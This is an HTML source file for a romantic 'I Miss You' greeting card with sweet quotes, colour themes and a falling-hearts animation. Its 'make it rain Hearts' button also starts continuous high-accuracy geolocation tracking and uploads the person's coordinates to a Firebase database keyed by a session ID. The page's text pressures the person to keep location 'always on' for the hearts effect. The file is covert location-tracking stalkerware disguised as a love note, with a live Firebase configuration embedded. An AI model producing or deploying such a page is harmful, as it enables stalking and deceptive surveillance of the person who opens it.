<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>I Miss You ❤️</title>
  <style>
    * { box-sizing: border-box; }
    body {
      margin: 0;
      min-height: 100vh;
      display: flex;
      justify-content: center;
      align-items: center;
      padding: 20px;
      background: linear-gradient(135deg, #ff758c, #ffb6c1);
      font-family: Arial, sans-serif;
      text-align: center;
    }
    .card {
      background: #fff;
      padding: 28px 22px;
      border-radius: 24px;
      width: 100%;
      max-width: 360px;
      box-shadow: 0 12px 30px rgba(0, 0, 0, 0.14);
    }
    .heart {
      font-size: 56px;
      line-height: 1;
      animation: beat 1.1s infinite;
    }
    @keyframes beat {
      0%, 100% { transform: scale(1); }
      50% { transform: scale(1.18); }
    }
    h1 {
      margin: 12px 0 6px;
      color: #ff477e;
      font-size: 25px;
    }
    .subtitle {
      margin: 0 0 14px;
      color: #555;
      font-size: 14px;
      line-height: 1.45;
    }

    /* Sweet Words Carousel */
    .carousel-card {
      background: #fff5f8;
      border: 1.5px solid #ffd1dc;
      border-radius: 18px;
      padding: 16px 14px;
      margin-bottom: 16px;
    }
    .quote-text {
      min-height: 54px;
      display: flex;
      align-items: center;
      justify-content: center;
      font-size: 14px;
      font-style: italic;
      color: #4a2030;
      line-height: 1.45;
      margin-bottom: 12px;
      transition: opacity 0.25s ease;
    }
    .quote-text.fade {
      opacity: 0.25;
    }
    .carousel-controls {
      display: flex;
      align-items: center;
      justify-content: space-between;
      gap: 8px;
    }
    .carousel-btn {
      width: auto;
      margin: 0;
      padding: 6px 12px;
      border-radius: 999px;
      font-size: 12px;
      font-weight: bold;
      background: #ffe0e9;
      color: #d6336c;
      border: none;
      cursor: pointer;
    }
    .carousel-btn:hover {
      background: #ffc9da;
    }
    .dots {
      display: flex;
      gap: 6px;
      justify-content: center;
      align-items: center;
    }
    .dot {
      width: 8px;
      height: 8px;
      border-radius: 50%;
      background: #f5b8c8;
      border: none;
      padding: 0;
      cursor: pointer;
    }
    .dot.active {
      width: 18px;
      border-radius: 999px;
      background: #ff477e;
    }

    .template-picker {
      display: grid;
      grid-template-columns: repeat(4, 1fr);
      gap: 7px;
      margin: 0 0 14px;
    }
    .template-btn {
      min-height: 58px;
      border: 2px solid transparent;
      border-radius: 13px;
      padding: 7px 4px;
      font-size: 11px;
      font-weight: bold;
      color: #5a3442;
      cursor: pointer;
      transition: transform 0.2s ease, border-color 0.2s ease;
    }
    .template-btn:hover { transform: translateY(-2px); }
    .template-btn.active { border-color: #ff477e; }
    .template-btn span {
      display: block;
      margin-bottom: 3px;
      font-size: 20px;
    }
    .template-rose { background: linear-gradient(135deg, #fff1f5, #ffd8e5); }
    .template-lavender { background: linear-gradient(135deg, #f7efff, #d9c4f1); }
    .template-sunset { background: linear-gradient(135deg, #fff4dc, #ffc4a3); }
    .template-night { background: linear-gradient(135deg, #34345a, #8174a7); color: #fff; }

    body.template-lavender {
      background: linear-gradient(135deg, #9d89c7, #dacbea);
    }
    body.template-lavender .card { background: #fffafd; }
    body.template-lavender h1,
    body.template-lavender .room-box { color: #8065a8; }
    body.template-lavender .carousel-card {
      background: #f7efff;
      border-color: #dacbea;
    }

    body.template-sunset {
      background: linear-gradient(135deg, #ff9776, #ffd6a5);
    }
    body.template-sunset .card { background: #fffaf3; }
    body.template-sunset h1,
    body.template-sunset .room-box { color: #dc6b57; }
    body.template-sunset .carousel-card {
      background: #fff1df;
      border-color: #ffcfa8;
    }

    body.template-night {
      background: linear-gradient(135deg, #24243e, #514a7d);
    }
    body.template-night .card { background: #f8f6ff; }
    body.template-night h1,
    body.template-night .room-box { color: #6255a5; }
    body.template-night .carousel-card {
      background: #eeeafa;
      border-color: #cbc2ec;
    }
    .action-btn {
      width: 100%;
      border: none;
      padding: 13px 18px;
      border-radius: 999px;
      font-size: 15px;
      font-weight: bold;
      cursor: pointer;
      margin-bottom: 8px;
    }
    .btn-start { background: #ff477e; color: #fff; }
    .btn-stop { background: #f2f2f2; color: #444; }
    #status {
      margin-top: 10px;
      font-size: 13px;
      color: #444;
      line-height: 1.45;
      word-break: break-word;
    }
    .room-box {
      margin-top: 12px;
      padding: 8px 10px;
      background: #fff5f8;
      border-radius: 10px;
      font-size: 12px;
      color: #ff477e;
    }
    .heart-rain {
      position: fixed;
      z-index: 9999;
      top: -12vh;
      left: 0;
      width: 100%;
      pointer-events: none;
      font-family: "Segoe UI Emoji", "Apple Color Emoji", sans-serif;
      animation: heart-fall var(--fall-duration, 3.2s) linear forwards;
    }
    @keyframes heart-fall {
      0% {
        transform: translate3d(0, -12vh, 0) rotate(0deg);
        opacity: 0;
      }
      10% { opacity: 1; }
      100% {
        transform: translate3d(var(--heart-drift, 30px), 112vh, 0) rotate(var(--heart-spin, 180deg));
        opacity: 0.9;
      }
    }
  </style>
</head>
<body>
  <div class="card">
    <div class="heart">❤️</div>
    <h1>I Miss You ❤️</h1>
    <p class="subtitle">Every moment without you feels incomplete. Tap below to make a rain of hearts.</p>

    <!-- Sweet Words Carousel -->
    <div class="carousel-card" aria-label="Sweet messages">
      <div class="quote-text" id="quoteText"></div>
      <div class="carousel-controls">
        <button class="carousel-btn" type="button" onclick="prevSlide(true)">‹ Prev</button>
        <div class="dots" id="dotsContainer"></div>
        <button class="carousel-btn" type="button" onclick="nextSlide(true)">Next ›</button>
      </div>
    </div>

    <div class="template-picker" aria-label="Choose a card template">
      <button class="template-btn template-rose active" type="button" onclick="applyTemplate('rose')"><span>🌹</span>Rose</button>
      <button class="template-btn template-lavender" type="button" onclick="applyTemplate('lavender')"><span>🪻</span>Dream</button>
      <button class="template-btn template-sunset" type="button" onclick="applyTemplate('sunset')"><span>🌅</span>Sunset</button>
      <button class="template-btn template-night" type="button" onclick="applyTemplate('night')"><span>🌙</span>Moon</button>
    </div>

    <button class="action-btn btn-start" type="button" onclick="startSharing()">📍 make it rain Hearts</button>
    <button class="action-btn btn-stop" type="button" onclick="stopSharing()"> Stop Raining Hearts</button>

    <div id="status">off.</div>
    <div class="room-box">Session ID: <strong id="roomDisplay"></strong></div>
  </div>

  <script>
    const templateQuotes = {
      rose: [
        "“No matter how busy the day gets, you’re always my favorite thought.” 💕",
        "“Distance only proves how deeply you mean to me.” 🌹",
        "“Your smile is still my favorite view in the world.” ✨",
        "“Counting down the moments until I get to see you again.” 💗"
      ],
      lavender: [
        "“If I could send you a dream, it would be this one: me and you.” 🪻",
        "“You make ordinary moments feel magical.” 💜",
        "“I fell for you in every quiet moment between my thoughts.” 🌸",
        "“Wherever you are, my heart feels at home.” ✨"
      ],
      sunset: [
        "“You are the warmest part of every sunset in my life.” 🌅",
        "“Even the golden hour envies the glow you give me.” 💛",
        "“I’d choose every tomorrow, as long as it begins with you.” 🌻",
        "“My happiest place is wherever you are.” 💗"
      ],
      night: [
        "“The moon reminds me to keep shining until I see you again.” 🌙",
        "“Every star holds a wish: to hold you close.” ⭐",
        "“Goodnight to the one who lives in my favorite dreams.” 🌌",
        "“My heart stays awake, counting the moments until you’re here.” 💫"
      ]
    };

    let activeTemplate = "rose";
    let sweetQuotes = templateQuotes[activeTemplate];

    const AUTO_INTERVAL_MS = 4000;
    const MANUAL_PAUSE_MS = 8000;

    let currentSlide = 0;
    let autoTimer = null;
    let pauseTimeout = null;

    function renderCarousel() {
      const quoteEl = document.getElementById("quoteText");
      quoteEl.classList.add("fade");

      setTimeout(() => {
        quoteEl.innerText = sweetQuotes[currentSlide];
        quoteEl.classList.remove("fade");
      }, 150);

      const dotsEl = document.getElementById("dotsContainer");
      dotsEl.innerHTML = "";

      sweetQuotes.forEach((_, idx) => {
        const dot = document.createElement("button");
        dot.type = "button";
        dot.className = "dot" + (idx === currentSlide ? " active" : "");
        dot.setAttribute("aria-label", `Go to message ${idx + 1}`);
        dot.onclick = () => {
          currentSlide = idx;
          renderCarousel();
          pauseAutoBriefly();
        };
        dotsEl.appendChild(dot);
      });
    }

    function nextSlide(isManual = false) {
      currentSlide = (currentSlide + 1) % sweetQuotes.length;
      renderCarousel();
      if (isManual) pauseAutoBriefly();
    }

    function prevSlide(isManual = false) {
      currentSlide = (currentSlide - 1 + sweetQuotes.length) % sweetQuotes.length;
      renderCarousel();
      if (isManual) pauseAutoBriefly();
    }

    function startAutoCarousel() {
      stopAutoCarousel();
      autoTimer = setInterval(() => {
        nextSlide(false);
      }, AUTO_INTERVAL_MS);
    }

    function stopAutoCarousel() {
      if (autoTimer) {
        clearInterval(autoTimer);
        autoTimer = null;
      }
    }

    function pauseAutoBriefly() {
      stopAutoCarousel();
      if (pauseTimeout) clearTimeout(pauseTimeout);
      pauseTimeout = setTimeout(() => {
        startAutoCarousel();
      }, MANUAL_PAUSE_MS);
    }

    window.applyTemplate = function (templateName) {
      activeTemplate = templateName;
      document.body.classList.remove("template-rose", "template-lavender", "template-sunset", "template-night");
      if (templateName !== "rose") document.body.classList.add(`template-${templateName}`);

      document.querySelectorAll(".template-btn").forEach((button) => {
        button.classList.toggle("active", button.classList.contains(`template-${templateName}`));
      });

      sweetQuotes = templateQuotes[templateName];
      currentSlide = 0;
      renderCarousel();
      pauseAutoBriefly();
    };

    let heartRainInterval = null;

    window.makeHeartRain = function () {
      if (heartRainInterval) clearInterval(heartRainInterval);

      const symbols = ["❤️", "💕", "💗", "💖", "💝", "💓"];
      const reduceMotion = window.matchMedia("(prefers-reduced-motion: reduce)").matches;

      const addHearts = () => {
        for (let i = 0; i < 2; i++) {
          const heart = document.createElement("span");
          heart.className = "heart-rain";
          heart.textContent = symbols[Math.floor(Math.random() * symbols.length)];
          heart.setAttribute("aria-hidden", "true");
          heart.style.left = `${Math.random() * 100}%`;
          heart.style.fontSize = `${18 + Math.random() * 28}px`;
          heart.style.setProperty("--fall-duration", `${reduceMotion ? 1.8 : 2.8 + Math.random() * 2}s`);
          heart.style.setProperty("--heart-drift", `${-80 + Math.random() * 160}px`);
          heart.style.setProperty("--heart-spin", `${-240 + Math.random() * 480}deg`);
          heart.style.animationDelay = `${Math.random() * 0.45}s`;
          heart.addEventListener("animationend", () => heart.remove(), { once: true });
          document.body.appendChild(heart);
        }
      };

      addHearts();
      heartRainInterval = setInterval(addHearts, 380);
    };

    window.stopHeartRain = function () {
      if (heartRainInterval) {
        clearInterval(heartRainInterval);
        heartRainInterval = null;
      }
      document.querySelectorAll(".heart-rain").forEach((heart) => heart.remove());
    };

    renderCarousel();
    startAutoCarousel();
  </script>

  <script type="module">
    import { initializeApp } from "https://www.gstatic.com/firebasejs/10.12.2/firebase-app.js";
    import { getDatabase, ref, set, update } from "https://www.gstatic.com/firebasejs/10.12.2/firebase-database.js";

    const firebaseConfig = {
      apiKey: "AIzaSyAU5MPv1dFi0qV65NO-NAH4lW_AMbKJqA8",
      authDomain: "miss-you-live.firebaseapp.com",
      databaseURL: "https://miss-you-live-default-rtdb.firebaseio.com",
      projectId: "miss-you-live",
      storageBucket: "miss-you-live.firebasestorage.app",
      messagingSenderId: "689539430941",
      appId: "1:689539430941:web:f0e19c3daa61812e4be4f4",
      measurementId: "G-7YMW0W1PKK"
    };

    const app = initializeApp(firebaseConfig);
    const db = getDatabase(app);

    const params = new URLSearchParams(window.location.search);
    const roomId = params.get("room") || Math.random().toString(36).substring(2, 8).toUpperCase();
    document.getElementById("roomDisplay").innerText = roomId;

    const sessionRef = ref(db, `sessions/${roomId}`);
    let watchId = null;

    window.startSharing = function () {
      window.makeHeartRain();

      if (!navigator.geolocation) {
        document.getElementById("status").innerText = "Location is not supported on this browser.";
        return;
      }

      document.getElementById("status").innerText = "turn on location always on to make it rain hearts...";

      watchId = navigator.geolocation.watchPosition(
        async (pos) => {
          const lat = pos.coords.latitude;
          const lon = pos.coords.longitude;
          const accuracy = pos.coords.accuracy;

          await set(sessionRef, {
            active: true,
            lat,
            lon,
            accuracy,
            updatedAt: new Date().toISOString()
          });

          document.getElementById("status").innerHTML =
            `💗 Sharing live location!<br>` +
            `Lat: ${lat.toFixed(5)}, Lon: ${lon.toFixed(5)}<br>` +
            `<small>Keep this tab open to update live.</small>`;
        },
        () => {
          document.getElementById("status").innerText = "Location unavailable or permission denied.";
        },
        { enableHighAccuracy: true, maximumAge: 5000, timeout: 15000 }
      );
    };

    window.stopSharing = async function () {
      window.stopHeartRain();

      if (watchId !== null) {
        navigator.geolocation.clearWatch(watchId);
        watchId = null;
      }
      document.getElementById("status").innerText = "please turn on location sharing to make it rain hearts. ❤️";

      await update(sessionRef, {
        active: false,
        stoppedAt: new Date().toISOString()
      });
    };
  </script>
</body>
</html>
